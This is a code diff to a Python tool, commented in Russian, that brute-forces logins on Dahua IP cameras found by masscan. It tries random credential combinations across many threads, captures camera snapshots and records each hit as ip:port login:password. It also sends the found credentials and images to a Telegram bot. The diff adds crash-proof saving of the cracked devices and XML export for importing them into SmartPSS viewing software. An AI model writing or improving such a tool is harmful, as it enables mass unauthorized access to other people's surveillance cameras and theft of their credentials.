@@ -1,20 +1,26 @@
 from __future__ import annotations
 
-from .dahua import DahuaController
-from . import combinations
-from . import parse_masscan
+import atexit
+import concurrent.futures
+from datetime import datetime
 import logging
 import os
-from datetime import datetime
 from pathlib import Path
-import concurrent.futures
 import re
+import signal
+import sys
 import threading
+
 import requests
 from tqdm import tqdm
 
+from . import combinations
+from . import parse_masscan
+from .dahua import DahuaController
+
 LOGGING_FOLDER = Path("dahua_logs")
 SNAPSHOTS_FOLDER = Path("snapshots")
+FOUND_DEVICES_FILE = Path("found_devices.txt")
 
 LOGGING_FOLDER.mkdir(parents=True, exist_ok=True)
 SNAPSHOTS_FOLDER.mkdir(parents=True, exist_ok=True)
@@ -31,7 +37,143 @@ stats_lock = threading.Lock()
 snapshots_count = 0
 alive_count = 0
 blocked_count = 0
-bruted_devices = []
+bruted_devices: list[tuple[str, int, str, str]] = []
+
+_emergency_lock = threading.Lock()
+_emergency_done = False
+_active_executor: concurrent.futures.ThreadPoolExecutor | None = None
+
+
+def _append_found_device(device: tuple[str, int, str, str], filepath: Path | str = FOUND_DEVICES_FILE) -> None:
+    """
+    Мгновенно дописывает найденное устройство на диск и сбрасывает буфер ядра (fsync).
+    Благодаря этому при SIGKILL (kill -9) или внезапном падении данные не теряются.
+    """
+    try:
+        ip, port, login, password = device
+        with open(filepath, "a", encoding="utf-8") as f:
+            f.write(f"{ip}:{port} {login}:{password}\n")
+            f.flush()
+            try:
+                os.fsync(f.fileno())
+            except Exception:
+                pass
+    except Exception as e:
+        logging.error(f"failed to append found device {device}: {e}")
+
+
+def emergency_save(
+    devices: list[tuple[str, int, str, str]] | None = None,
+    make_xml: bool = True,
+    max_xml_entries: int = 64
+) -> tuple[int, list[str]]:
+    """
+    Экстренное сохранение всех авторизованных устройств:
+    1. Синхронизирует found_devices.txt без дубликатов.
+    2. Генерирует XML-отчёты для SmartPSS в папке reports/.
+    """
+    global bruted_devices
+    with stats_lock:
+        to_save = list(devices if devices is not None else bruted_devices)
+
+    if not to_save:
+        return 0, []
+
+    # 1. Проверяем и дополняем текстовый файл без дубликатов
+    existing_lines = set()
+    if FOUND_DEVICES_FILE.exists():
+        try:
+            with open(FOUND_DEVICES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    existing_lines.add(line.strip())
+        except Exception:
+            pass
+
+    try:
+        with open(FOUND_DEVICES_FILE, "a", encoding="utf-8") as f:
+            for ip, port, login, password in to_save:
+                entry = f"{ip}:{port} {login}:{password}"
+                if entry not in existing_lines:
+                    f.write(entry + "\n")
+                    existing_lines.add(entry)
+            f.flush()
+            try:
+                os.fsync(f.fileno())
+            except Exception:
+                pass
+    except Exception as e:
+        logging.error(f"failed emergency txt save: {e}")
+
+    # 2. Генерируем XML для импорта в SmartPSS
+    saved_xmls: list[str] = []
+    if make_xml:
+        try:
+            from . import save_to_xml
+            saved_xmls = save_to_xml.save_xml(to_save, max_xml_entries=max_xml_entries)
+        except Exception as e:
+            logging.error(f"failed emergency xml save: {e}")
+
+    return len(to_save), saved_xmls
+
+
+def _emergency_signal_handler(signum: int, frame) -> None:
+    """
+    Перехватчик сигналов SIGTERM, SIGBREAK, SIGHUP для мгновенного сохранения.
+    """
+    global _emergency_done, _active_executor
+
+    sig_name = "UNKNOWN"
+    try:
+        sig_name = signal.Signals(signum).name
+    except Exception:
+        sig_name = str(signum)
+
+    with _emergency_lock:
+        if _emergency_done:
+            return
+        _emergency_done = True
+
+    if _active_executor is not None:
+        try:
+            _active_executor.shutdown(wait=False, cancel_futures=True)
+        except Exception:
+            pass
+
+    logging.warning(f"emergency shutdown triggered by signal: {sig_name}")
+    print(f"\n\033[1;31m[!] Перехвачен сигнал {sig_name} — экстренно сохраняем камеры...\033[0m")
+
+    count, xml_files = emergency_save(make_xml=True)
+    if count > 0:
+        msg = f"[✓] Экстренно сохранено {count} устройств в {FOUND_DEVICES_FILE.name}"
+        if xml_files:
+            msg += f" и XML для SmartPSS: {', '.join(xml_files)}"
+        print(f"\033[1;32m{msg}\033[0m")
+    else:
+        print("\033[1;33m[i] Найденных камер нет, сохранять нечего.\033[0m")
+
+    sys.exit(128 + signum if isinstance(signum, int) else 1)
+
+
+def setup_signal_handlers() -> None:
+    """Регистрация обработчиков системных сигналов завершения."""
+    for sig_name in ("SIGTERM", "SIGBREAK", "SIGHUP"):
+        if hasattr(signal, sig_name):
+            try:
+                sig = getattr(signal, sig_name)
+                signal.signal(sig, _emergency_signal_handler)
+            except (ValueError, OSError, AttributeError):
+                pass
+
+
+def _atexit_handler() -> None:
+    """Страховочный atexit-обработчик на случай неожиданного выхода."""
+    global _emergency_done
+    if not _emergency_done and bruted_devices:
+        emergency_save(make_xml=True)
+
+
+atexit.register(_atexit_handler)
+setup_signal_handlers()
 
 
 def post_tg(token: str, chat_id: str | int, device: tuple[str, int], ss_path: str | None, login: str, password: str) -> bool:
@@ -69,10 +211,10 @@ def post_tg(token: str, chat_id: str | int, device: tuple[str, int], ss_path: st
             logging.debug(f"user was successfully notified about {device[0]}:{device[1]}")
             return True
         else:
-            logging.error(f"tg api notification error ({resp.status_code}): {resp.text}")
+            logging.error(f"telegram API notification error ({resp.status_code}): {resp.text}")
             return False
     except Exception as e:
-        logging.error(f"error when notifying via tg: {e}")
+        logging.error(f"error when notifying via telegram: {e}")
         return False
 
 
@@ -93,7 +235,7 @@ def get_snapshot(ip: str, port: int, login: str, passw: str) -> str | None:
 
                     safe_login = re.sub(r'[^\w\-]', '_', login)
                     safe_pass = re.sub(r'[^\w\-]', '_', passw)
-                    filename = f"{ip}_{port}_{safe_login}_{safe_pass}_ch{chn}.jpg"
+                    filename = f"{ip}_{port}_{safe_login}_{safe_pass}_chn{chn}.jpg"
                     file_path = SNAPSHOTS_FOLDER / filename
 
                     with open(file_path, "wb") as ss:
@@ -153,8 +295,11 @@ def check_host(host_str: str, cred_list: list, dosnap: bool, notify: bool, token
             logging.warning(f"{ip}:{port} blocked login attempts, stopping")
             return "blocked"
         elif res:
+            device = (ip, port, login, password)
             with stats_lock:
-                bruted_devices.append((ip, port, login, password))
+                bruted_devices.append(device)
+                # Мгновенная синхронизация на диск для защиты от SIGKILL / аварийного падения
+                _append_found_device(device)
 
             ss_path = None
             if dosnap:
@@ -192,9 +337,11 @@ def brute(
     threads: int = 100,
     notify: bool = True,
     status_callback=None,
-    show_progress: bool = True
-) -> list:
-    global bruted_devices
+    show_progress: bool = True,
+    make_import_file: bool = True,
+    max_entries: int = 64
+) -> list[tuple[str, int, str, str]]:
+    global bruted_devices, _active_executor
     bruted_devices = []
 
     try:
@@ -223,56 +370,77 @@ def brute(
         )
         pbar.set_description_str(f"authed: {authed_count} * blocked: {blocked_count} * dead: {dead_count}")
 
-    try:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-            for device in devices:
-                creds = combinations.get_random(5)
-                future = executor.submit(
-                    check_host,
-                    device,
-                    creds,
-                    dosnap,
-                    notify,
-                    token,
-                    id
-                )
-                workers.append(future)
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=threads)
+    _active_executor = executor
 
-            for future in concurrent.futures.as_completed(workers):
-                try:
-                    res = future.result()
-                    if isinstance(res, tuple) and len(res) == 4:
-                        authed_count += 1
-                        if status_callback:
-                            status_callback(res)
-                    elif res == "blocked":
-                        blocked_count += 1
-                    else:
-                        dead_count += 1
-                except Exception as e:
-                    logging.debug(f"worker exception: {e}")
+    try:
+        for device in devices:
+            creds = combinations.get_random(5)
+            future = executor.submit(
+                check_host,
+                device,
+                creds,
+                dosnap,
+                notify,
+                token,
+                id
+            )
+            workers.append(future)
+
+        for future in concurrent.futures.as_completed(workers):
+            try:
+                res = future.result()
+                if isinstance(res, tuple) and len(res) == 4:
+                    authed_count += 1
+                    if status_callback:
+                        status_callback(res)
+                elif res == "blocked":
+                    blocked_count += 1
+                else:
                     dead_count += 1
-                finally:
-                    if pbar is not None:
-                        pbar.set_description_str(f"authed: {authed_count} * blocked: {blocked_count} * dead: {dead_count}")
-                        pbar.update(1)
+            except Exception as e:
+                logging.debug(f"worker exception: {e}")
+                dead_count += 1
+            finally:
+                if pbar is not None:
+                    pbar.set_description_str(f"authed: {authed_count} * blocked: {blocked_count} * dead: {dead_count}")
+                    pbar.update(1)
 
     except KeyboardInterrupt:
-        logging.warning("scanning interrupted by user")
+        logging.warning("scanning interrupted by user (SIGINT/Ctrl+C)")
+        executor.shutdown(wait=False, cancel_futures=True)
         for w in workers:
             w.cancel()
+        if pbar is not None:
+            pbar.close()
+            pbar = None
+        print("\n\033[1;33m[!] Сканирование прервано пользователем (Ctrl+C / SIGINT)!\033[0m")
+        count, xml_files = emergency_save(make_xml=make_import_file, max_xml_entries=max_entries)
+        if count > 0:
+            msg = f"\033[1;32m[✓] Экстренно сохранено {count} камер в {FOUND_DEVICES_FILE.name}\033[0m"
+            if xml_files:
+                msg += f"\033[1;36m и XML: {', '.join(xml_files)}\033[0m"
+            print(msg)
+        else:
+            print("\033[1;33m[i] Найденных камер нет.\033[0m")
     except Exception as e:
         logging.error(f"bruteforcing was interrupted: {e}")
+        executor.shutdown(wait=False, cancel_futures=True)
         for w in workers:
             w.cancel()
+        emergency_save(make_xml=make_import_file, max_xml_entries=max_entries)
     finally:
         if pbar is not None:
             pbar.close()
+        executor.shutdown(wait=False, cancel_futures=True)
+        _active_executor = None
 
-    if bruted_devices:
-        results_file = Path("found_devices.txt")
-        with open(results_file, "a", encoding="utf-8") as out:
-            for ip, port, login, password in bruted_devices:
-                out.write(f"{ip}:{port} {login}:{password}\n")
+    # Штатное сохранение отчёта XML (found_devices.txt уже синхронизирован в реальном времени)
+    if bruted_devices and make_import_file:
+        try:
+            from . import save_to_xml
+            save_to_xml.save_xml(bruted_devices, max_xml_entries=max_entries)
+        except Exception as e:
+            logging.error(f"failed to generate final XML: {e}")
 
     return list(bruted_devices)
